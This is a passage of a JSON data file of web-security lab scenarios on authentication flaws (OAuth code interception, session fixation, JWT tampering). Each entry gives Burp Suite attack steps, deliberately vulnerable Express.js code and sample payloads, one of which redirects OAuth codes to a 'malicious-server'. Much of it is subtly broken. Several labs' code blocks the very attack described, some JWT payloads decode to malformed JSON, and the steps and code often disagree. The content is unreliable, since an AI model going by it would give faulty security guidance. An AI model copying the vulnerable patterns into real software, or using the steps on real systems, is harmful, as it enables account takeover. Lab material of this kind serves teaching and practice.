        "1. Identify the OAuth flow by observing the /auth endpoint during the login process.",
        "2. Use Burp Suite to capture the redirect URI after the OAuth authentication process.",
        "3. Modify the redirect URI to point to a malicious server controlled by the attacker.",
        "4. Intercept the authorization code and exchange it for an access token using the OAuth token endpoint.",
        "5. Use the access token to impersonate the victim and gain access to their account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const { OAuth2Client } = require('google-auth-library'); const app = express(); const client = new OAuth2Client('client-id', 'client-secret'); app.get('/auth', (req, res) => { const redirectUri = 'http://localhost:4000/callback'; const authUrl = client.generateAuthUrl({ scope: 'https://www.googleapis.com/auth/userinfo.profile', redirect_uri: redirectUri }); res.redirect(authUrl); }); app.get('/callback', (req, res) => { const { code } = req.query; client.getToken(code, (err, tokens) => { if (err) return res.status(400).send('Error exchanging code for token'); res.send('Access token obtained: ' + tokens.access_token); }); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "Authorization Code: <hijacked-authorization-code>",
        "Redirect URI: http://malicious-server/callback"
      ]
    },
    {
      "Lab scenario": "Session Fixation via URL manipulation",
      "Lab Description": "This lab demonstrates a session fixation vulnerability where an attacker can force a user to authenticate with a session ID of their choice. The session is fixed before login and cannot be reset after authentication. To solve this lab, hijack the victim's session and access their account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Log in to your account and note the session ID set in the response cookie.",
        "2. Use Burp Suite to intercept the login request and modify the session cookie to a predetermined value.",
        "3. Log out of your account and log in with the victim's credentials, using the intercepted session ID.",
        "4. Observe that the victim's session is reused, and access the victim's account page.",
        "5. Confirm the exploit is successful when the victim's account page is loaded."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'secret', resave: true, saveUninitialized: true }));\n\nlet users = [{ username: 'victim', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.user = user;\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  if (req.session.user) {\n    res.send('Account details for ' + req.session.user.username);\n  } else {\n    res.status(401).send('Access denied');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "sessionid=fixed-session-id"
      ]
    },
    {
      "Lab scenario": "JWT Tampering for Privilege Escalation",
      "Lab Description": "In this lab, the application improperly validates JWT tokens, allowing attackers to tamper with the payload and escalate their privileges. The goal is to modify the JWT to escalate your privileges to admin and access the restricted admin page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Log in with a regular user account and capture the JWT token sent in the Authorization header.",
        "2. Decode the JWT token using a tool like jwt.io to reveal the payload.",
        "3. Modify the payload's role field to 'admin' and re-encode the JWT token.",
        "4. Replace the original JWT token in your requests with the modified token.",
        "5. Access the restricted admin page, confirming successful privilege escalation."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = [{ username: 'user', password: 'userpassword', role: 'user' }];\nconst secret = 'secretkey';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ username: user.username, role: user.role }, secret);\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  jwt.verify(token, secret, (err, decoded) => {\n    if (err || decoded.role !== 'admin') {\n      return res.status(403).send('Access denied');\n    }\n    res.send('Admin dashboard');\n  });\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
      "payloads": [
        "header: { 'alg': 'HS256', 'typ': 'JWT' }",
        "payload: { 'username': 'user', 'role': 'admin' }",
        "signature: <generated signature after re-encoding>"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration for Token Leakage",
      "Lab Description": "This lab demonstrates an OAuth misconfiguration where the client inadvertently exposes an authorization code to an attacker. To solve the lab, intercept and reuse the exposed authorization code to obtain an access token and access the victim's account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Trigger the OAuth login flow by clicking the 'Log in with OAuth' button.",
        "2. Use Burp Suite to intercept the authorization code sent to the client after a successful OAuth authentication.",
        "3. Extract the authorization code from the intercepted request.",
        "4. Exchange the authorization code for an access token by sending a POST request to the token endpoint.",
        "5. Use the obtained access token to access the victim's account page."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\napp.get('/auth', (req, res) => {\n  res.redirect('https://oauth.provider.com/authorize?response_type=code&client_id=client-id&redirect_uri=http://localhost:4000/callback');\n});\n\napp.get('/callback', async (req, res) => {\n  const code = req.query.code;\n  const response = await axios.post('https://oauth.provider.com/token', {\n    code: code,\n    client_id: 'client-id',\n    client_secret: 'client-secret',\n    redirect_uri: 'http://localhost:4000/callback'\n  });\n  res.json({ access_token: response.data.access_token });\n});\n\napp.get('/my-account', (req, res) => {\n  res.send('Account details for user');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
      "payloads": [
        "code=<extracted authorization code>",
        "access_token=<obtained access token>"
      ]
    },
    {
      "Lab scenario": "JWT Token Manipulation in Authorization Header",
      "Lab Description": "This lab's JWT authentication can be bypassed by tampering with the token in the Authorization header. The token is being sent with the 'Bearer' prefix in the request header. To solve the lab, you need to manipulate the JWT token to impersonate the 'admin' user and access their dashboard page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the login request using Burp Suite.",
        "2. Capture the JWT token from the Authorization header.",
        "3. Decode the JWT token and analyze its payload to locate the user role.",
        "4. Modify the 'role' field from 'user' to 'admin' and re-encode the JWT.",
        "5. Replace the old JWT token in the Authorization header with the newly crafted one and resend the request.",
        "6. If successful, you should gain access to the 'admin' dashboard, solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst secretKey = 'your_secret_key';\n\nconst users = [{ username: 'user', password: 'user123', role: 'user' }, { username: 'admin', password: 'admin123', role: 'admin' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ username: user.username, role: user.role }, secretKey, { expiresIn: '1h' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin-dashboard', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token) {\n    jwt.verify(token, secretKey, (err, decoded) => {\n      if (err || decoded.role !== 'admin') {\n        return res.status(403).send('Forbidden');\n      }\n      res.send('Admin Dashboard');\n    });\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Manipulation Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "Session Fixation in Login Process",
      "Lab Description": "This lab is vulnerable to session fixation, where the session ID is set by the attacker and not regenerated after login. To solve the lab, you need to fix the session ID and use it to authenticate as Carlos after he logs in.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Start by logging in to your own account and obtain the session ID from the 'Set-Cookie' response header.",
        "2. Log out of your account and note the session cookie set on the browser.",
        "3. Manually set the session cookie to the value obtained earlier from Carlos's session.",
        "4. Login as Carlos with valid credentials, but ensure that the session cookie from step 2 is maintained.",
        "5. Once Carlos's session is established, access his account page to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst users = [{ username: 'carlos', password: 'password123', sessionId: 'abcd1234' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    res.cookie('sessionId', user.sessionId);\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  const user = users.find(u => u.sessionId === sessionId);\n  if (user) {\n    res.send('Account details for carlos');\n  } else {\n    res.send('Access denied');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log('Session Fixation Lab running on http://localhost:${PORT}');\n});"
    },
    {
      "Lab scenario": "Broken OAuth Flow in External API",
      "Lab Description": "This lab demonstrates a broken OAuth flow where the application doesn't properly validate the 'state' parameter in the OAuth redirect. To solve the lab, you need to intercept the OAuth callback request and modify the 'state' parameter to gain unauthorized access to the user account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept the OAuth authorization request using Burp Suite and capture the URL sent to the OAuth provider.",
        "2. Observe the 'state' parameter in the URL and take note of its value.",
        "3. After authorization, intercept the callback response from the OAuth provider and locate the 'state' parameter in the redirect URL.",
        "4. Modify the 'state' parameter to a value of your choice and resend the request.",
        "5. Upon successful redirection, access the user account page to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst oauthClientId = 'myClientId';\nconst oauthClientSecret = 'myClientSecret';\nconst oauthRedirectUri = 'http://localhost:4000/callback';\n\napp.get('/login', (req, res) => {\n  const state = Math.random().toString(36).substring(7);\n  const authUrl = `https://oauthprovider.com/authorize?client_id=${oauthClientId}&redirect_uri=${oauthRedirectUri}&state=${state}`;\n  res.redirect(authUrl);\n});\n\napp.get('/callback', async (req, res) => {\n  const { code, state } = req.query;\n  if (state !== 'expected-state') {\n    return res.status(403).send('Invalid state parameter');\n  }\n  const response = await axios.post('https://oauthprovider.com/token', { code, client_id: oauthClientId, client_secret: oauthClientSecret, redirect_uri: oauthRedirectUri });\n  res.json({ access_token: response.data.access_token });\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Broken OAuth Flow Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "JWT Signature Bypass",
      "Lab Description": "This lab involves a vulnerable JWT-based authentication system where the server does not properly verify the algorithm used for signing the token. You can exploit this vulnerability to bypass authentication. The lab's goal is to forge a JWT with a different signing algorithm to impersonate a valid user.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept a valid JWT in the login process using Burp Suite.",
        "2. Notice the JWT header indicating the algorithm used for signing (HS256).",
        "3. Decode the JWT and extract the payload and the signature.",
        "4. Modify the algorithm in the JWT header to 'none' and remove the signature part.",
        "5. Send the modified JWT in an authentication request using Postman.",
        "6. Observe the server's response indicating successful login despite invalid signature.",
        "7. Verify the bypass by accessing the protected resources with the forged JWT."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const users = [{ username: 'admin', password: 'password' }]; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'password') { const token = jwt.sign({ username }, 'secretKey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const token = req.headers['authorization']; jwt.verify(token, 'secretKey', (err, decoded) => { if (err) return res.status(403).send('Forbidden'); res.json({ message: 'Welcome to the dashboard', user: decoded.username }); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Signature Bypass Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "eyJhbGciOiAiTm9uZSI6ICJzdHJpbmciLCJraWQiOiAiYWRtaW4ifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "eyJhbGciOiAiSEMyNTYiOiAiYWRtaW4ifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session Fixation Exploit",
      "Lab Description": "This lab demonstrates a session fixation vulnerability where an attacker can set a session ID for a user before they authenticate. Exploiting this flaw, the attacker can force the application to use their own session ID, gaining unauthorized access.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Log in to the application and intercept the session ID in the response using Burp Suite.",
        "2. Set the session ID manually using Burp's Cookie editor or Postman to an arbitrary value.",
        "3. Log out of the application and send a new login request with the fixed session ID.",
        "4. Observe that the server accepts the fixed session ID and logs the user in.",
        "5. Access the protected resources using the fixed session ID to confirm the exploitation of the vulnerability."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secretKey', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { if (req.query.username === 'admin' && req.query.password === 'password') { req.session.user = 'admin'; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) { res.send('Welcome ' + req.session.user); } else { res.status(401).send('Access Denied'); } }); const PORT = 3000; app.listen(PORT, () => { console.log('Session Fixation Lab running on http://localhost:${PORT}'); });",
      "payloads": [
        "sessionid=abcd1234",
        "sessionid=fixedsessionid"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration Exploit",
      "Lab Description": "This lab involves a misconfigured OAuth 2.0 authorization flow where the authorization code is exposed in the URL without proper protection. An attacker can intercept the code and use it to gain unauthorized access to the target application.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Observe the OAuth 2.0 login flow and capture the authorization code in the redirect URL using Burp Suite.",
        "2. Notice that the authorization code is not protected and can be easily intercepted in the URL.",
        "3. Use the captured authorization code to request an access token via Postman.",
        "4. Examine the response and extract the access token.",
        "5. Use the access token to access protected resources and verify the exploit.",
        "6. Test the full process using Burp Suite to automate the capture and exploitation of authorization codes."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const oauth = require('simple-oauth2'); const credentials = { client: { id: 'client_id', secret: 'client_secret' }, auth: { tokenHost: 'http://localhost:4000' } }; const oauth2 = oauth.create(credentials); app.get('/login', (req, res) => { const authorizationUri = oauth2.authorizationCode.authorizeURL({ redirect_uri: 'http://localhost:4000/callback', scope: 'read' }); res.redirect(authorizationUri); }); app.get('/callback', (req, res) => { const { code } = req.query; oauth2.authorizationCode.getToken({ code, redirect_uri: 'http://localhost:4000/callback' }).then(result => { const token = oauth2.accessToken.create(result); res.json({ access_token: token.token.access_token }); }); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "authorization_code=code_example",
        "code=interceptedcode"
      ]
    },
    {
      "Lab scenario": "JWT token tampering in authentication",
      "Lab Description": "This lab demonstrates a vulnerability in the handling of JWT tokens. The application uses JWT for session management but does not verify the integrity of the token, making it susceptible to manipulation. To solve the lab, you need to tamper with the JWT token and bypass authentication to access the account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Capture the JWT token from the Authorization header using Burp Suite's Proxy.",
        "2. Decode the JWT token using a tool like JWT.io to inspect its payload and signature.",
        "3. Modify the 'user' claim in the payload to change the username to 'admin'.",
        "4. Re-encode the JWT token without modifying the signature to simulate token tampering.",
        "5. Send the tampered token in a request to the server and observe the response to ensure successful authentication bypass.",
        "6. Access the account page to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst users = [{ username: 'user', password: 'password123' }];\napp.use(express.json());\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n  const token = jwt.sign({ user: username }, 'secretkey');\n  res.json({ token });\n});\napp.post('/account', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  jwt.verify(token, 'secretkey', (err, decoded) => {\n    if (err) return res.status(401).send('Unauthorized');\n    res.send(`Welcome, ${decoded.user}`);\n  });\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "Bearer <tampered_jwt_token>"
      ]
    },
    {
      "Lab scenario": "Session fixation via URL parameter",
      "Lab Description": "The application allows session fixation attacks through URL parameters. By manipulating the session ID, you can hijack another user's session. To solve the lab, fix the session ID to another user's value and access their account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Capture a valid session ID by logging in with your own account and inspecting the Set-Cookie header in the response.",
        "2. Log out of the application and intercept the logout request using Burp Suite.",
        "3. Modify the session ID in the request URL to match the valid session ID you captured earlier.",
        "4. Send the modified request to the server and observe the response. The server should return the session for the previous user, not yours.",
        "5. Access the account page using the hijacked session and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst app = express();\nconst users = [{ username: 'user1', password: 'password123' }, { username: 'admin', password: 'admin123' }];\nlet sessions = {};\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n  const sessionId = `${user.username}-session`;\n  sessions[sessionId] = username;\n  res.cookie('sessionId', sessionId);\n  res.send('Logged in');\n});\napp.post('/logout', (req, res) => {\n  const sessionId = req.cookies['sessionId'];\n  delete sessions[sessionId];\n  res.send('Logged out');\n});\napp.get('/account', (req, res) => {\n  const sessionId = req.cookies['sessionId'];\n  if (!sessions[sessionId]) return res.status(401).send('Unauthorized');\n  res.send(`Welcome ${sessions[sessionId]}`);\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "sessionId=<fixed_session_id>"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration allowing unauthorized access",
      "Lab Description": "The application uses OAuth for authorization but is misconfigured, allowing unauthorized users to access protected resources. To solve the lab, perform an OAuth misconfiguration exploit to access Carlos's account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the OAuth authorization request using Burp Suite's Proxy.",
        "2. Observe that the authorization code request does not correctly validate the 'scope' parameter, which controls access levels.",
        "3. Modify the 'scope' parameter to include an unauthorized scope value (e.g., 'admin') and resend the request.",
        "4. Obtain the authorization code from the response and exchange it for an access token.",
        "5. Use the access token to access the admin resources and solve the lab by loading Carlos's account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst oauth2 = require('simple-oauth2');\nconst app = express();\nlet tokens = {};\nlet users = [{ username: 'carlos', password: 'password123' }];\napp.use(express.json());\nconst oauth2Client = oauth2.create({ client: { id: 'client_id', secret: 'client_secret' }, auth: { tokenHost: 'http://localhost:4000' } });\napp.post('/authorize', (req, res) => {\n  const { scope, code } = req.body;\n  if (scope === 'admin') {\n    const token = oauth2Client.accessToken.create({ access_token: 'valid_token' });\n    tokens[code] = token;\n    res.json({ token: token.access_token });\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\napp.get('/account', (req, res) => {\n  const { access_token } = req.query;\n  if (tokens[access_token]) {\n    res.send(`Welcome Carlos with token ${access_token}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "Authorization Code: <misconfigured_oauth_code>",
        "Access Token: <unauthorized_access_token>"
      ]
    },
    {
      "Lab scenario": "JWT Token Tampering",
      "Lab Description": "In this lab, the application's JWT authentication system has weak implementation. The JWT is signed using a weak algorithm, allowing the token to be tampered with. To solve the lab, tamper with the JWT token to escalate privileges and access a restricted user account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the authentication request and capture the JWT token.",
        "2. Examine the JWT structure to identify its algorithm and key. Decode the token using an online JWT decoder.",
        "3. Identify the payload and modify the user role from 'user' to 'admin'. Re-encode the token with the same header and payload but use a new, valid signature.",
        "4. Replace the original token with the tampered token in the Authorization header and send the modified request.",
        "5. Verify that you have gained admin access by navigating to the admin panel or viewing restricted data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\nconst secretKey = 'supersecretkey';\nconst users = [{ username: 'user1', password: 'password123', role: 'user' }, { username: 'admin', password: 'adminpassword', role: 'admin' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ username: user.username, role: user.role }, secretKey, { algorithm: 'HS256', expiresIn: '1h' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (!token) return res.status(403).send('No token provided');\n  jwt.verify(token, secretKey, (err, decoded) => {\n    if (err || decoded.role !== 'admin') return res.status(403).send('Forbidden');\n    res.send('Welcome Admin!');\n  });\n});\nconst PORT = 3000;\napp.listen(PORT, () => { console.log(`JWT Tampering Lab running on http://localhost:${PORT}`); });",
      "payloads": [
        "eyJhbGciOiAiSFMyNTYiLCJraWQiOiAiY2xpZW50X2lkIiwgInN1YiI6ICJ1c2VyMSIsICJyb2xlIjogImFkbWluIn0=.eyJpdiI6ICJjb250ZXh0ZWRfcm9sZXMiLCAiYWRtaW4iOiAiYWRtaW5fYXV0aGVudGljYXRlIiB9"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration and Token Hijacking",
      "Lab Description": "The application implements OAuth for user authentication but has a misconfigured token exchange endpoint. By exploiting the misconfiguration, you can hijack an access token from another user and access their account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the OAuth token request and capture the authorization code.",
        "2. Analyze the OAuth token endpoint and notice that there is a lack of proper state validation or session binding.",
        "3. Use the captured authorization code to request an access token for yourself, but modify the request to swap the client ID with that of another user.",
        "4. Use the hijacked token to access the victim's account by sending the token in the Authorization header in subsequent requests.",
        "5. Verify access to the victim's account by navigating to their profile or restricted data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst request = require('request');\nconst app = express();\napp.use(express.json());\nconst oauthClients = { 'client1': 'clientsecret1', 'client2': 'clientsecret2' };\nconst tokens = {}; // Insecure storage of tokens\napp.post('/oauth/token', (req, res) => {\n  const { code, client_id } = req.body;\n  if (!oauthClients[client_id]) {\n    return res.status(400).send('Invalid client');\n  }\n  // Issue token based on code\n  const accessToken = 'access_token_for_' + client_id + '_user';\n  tokens[client_id] = accessToken;\n  res.json({ access_token: accessToken });\n});\napp.get('/user', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (!token || !Object.values(tokens).includes(token)) {\n    return res.status(401).send('Unauthorized');\n  }\n  res.send('User data');\n});\nconst PORT = 3000;\napp.listen(PORT, () => { console.log(`OAuth Misconfiguration Lab running on http://localhost:${PORT}`); });",
      "payloads": [
        "client_id=client2&code=xyz123&client_secret=clientsecret2"
      ]
    },
    {
      "Lab scenario": "Session Fixation Vulnerability",
      "Lab Description": "This lab demonstrates a session fixation vulnerability where the application accepts a session ID passed in the URL. By setting the session ID before login, you can hijack a user's session after they log in.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Log in to the application and notice the session ID being set in the URL as a query parameter.",
        "2. Log out of your account.",
        "3. Manually set the session ID in the URL to match an active session ID that corresponds to a valid user.",
        "4. Log in with valid credentials while keeping the session ID fixed in the URL.",
        "5. Access the other user's account page and verify the session hijack is successful."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'secret', resave: true, saveUninitialized: true }));\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user' && password === 'password') {\n    req.session.user = username;\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.user) {\n    res.send('Account page for ' + req.session.user);\n  } else {\n    res.send('Please log in');\n  }\n});\nconst PORT = 3000;\napp.listen(PORT, () => { console.log(`Session Fixation Lab running on http://localhost:${PORT}`); });",
      "payloads": [
        "session_id=abcdef12345"
      ]
    },
  
    {
      "Lab scenario": "JWT token manipulation for unauthorized access",
      "Lab Description": "In this lab, the JWT token used for authenticating a user can be manipulated, allowing unauthorized access to protected routes. The token has insufficient validation checks, allowing attackers to alter user roles and gain elevated privileges. To solve this lab, gain access to Carlos's admin account by manipulating the JWT token.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the authentication request using Burp Suite and observe the JWT token in the response headers.",
        "2. Identify the structure of the JWT token and locate the payload section containing the user role.",
        "3. Craft a new JWT token where the user role is changed to 'admin'. Base64-encode the modified payload and sign the new token using the same key as the original.",
        "4. Replace the old JWT token with the new one in the subsequent request to access protected routes.",
        "5. Upon successfully receiving admin privileges, access Carlos's admin dashboard to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secretKey = 'mysecret'; const users = [{ username: 'carlos', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, secretKey); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('Access denied'); jwt.verify(token, secretKey, (err, decoded) => { if (err) return res.status(403).send('Access denied'); if (decoded.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to the admin panel'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "Session fixation vulnerability",
      "Lab Description": "This lab demonstrates a session fixation vulnerability where the attacker can hijack the session of another user. To solve this lab, fix the session ID to a known value, then log in as Carlos and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. With Burp Suite running, intercept the request when logging into your account and take note of the session ID returned.",
        "2. Manually set the session cookie to a fixed value before sending the login request, ensuring it matches the session ID you obtained earlier.",
        "3. Use the fixed session ID to log into Carlos's account.",
        "4. After successful login, access Carlos's account page and complete the lab."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123', session: 'abcd1234' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('session', user.session); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const session = req.cookies.session; const user = users.find(u => u.session === session); if (user) { res.send(`Welcome ${user.username}`); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "OAuth misconfiguration leading to unauthorized access",
      "Lab Description": "This lab demonstrates an OAuth misconfiguration where the authorization code can be intercepted and reused by an attacker, allowing them to impersonate another user. To solve this lab, intercept and reuse the authorization code to access Carlos's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept the OAuth authorization request using Burp Suite and capture the authorization code in the response.",
        "2. Modify the authorization code to use a different redirect URI controlled by the attacker, ensuring that the authorization code will be sent to the attacker's server.",
        "3. Exchange the intercepted authorization code for an access token by sending a POST request to the OAuth token endpoint with the authorization code.",
        "4. Use the access token to send authenticated requests and impersonate Carlos, accessing his protected account page.",
        "5. Verify that you have gained unauthorized access to Carlos's account to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express'); const axios = require('axios'); const app = express(); const oauthClientId = 'client123'; const oauthClientSecret = 'secret123'; let authorizationCode = 'abcd1234'; let accessToken = ''; app.get('/authorize', (req, res) => { const { code } = req.query; if (code === authorizationCode) { res.redirect(`http://localhost:4000/callback?code=${authorizationCode}`); } else { res.status(400).send('Invalid code'); } }); app.post('/token', (req, res) => { const { code } = req.body; if (code === authorizationCode) { accessToken = 'access_token_1234'; res.json({ access_token: accessToken }); } else { res.status(400).send('Invalid code'); } }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (token === accessToken) { res.send('Welcome Carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "JWT Token Manipulation in Authorization Flow",
      "Lab Description": "The application utilizes JWT for authorization but improperly validates the token signature, allowing for manipulation. The goal is to tamper with the JWT token and access a restricted resource that should otherwise be protected.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the request where the JWT token is sent to the server for authorization using Burp Suite.",
        "2. Decode the JWT token using a tool like jwt.io and observe the payload.",
        "3. Modify the payload to escalate user privileges or change user roles, while ensuring the token signature remains valid.",
        "4. Re-encrypt the modified JWT token and send it back to the server in the Authorization header.",
        "5. Confirm if the modified token successfully bypasses the authorization and allows access to restricted resources."
      ],
      "Vulnerability name": "Authentication",
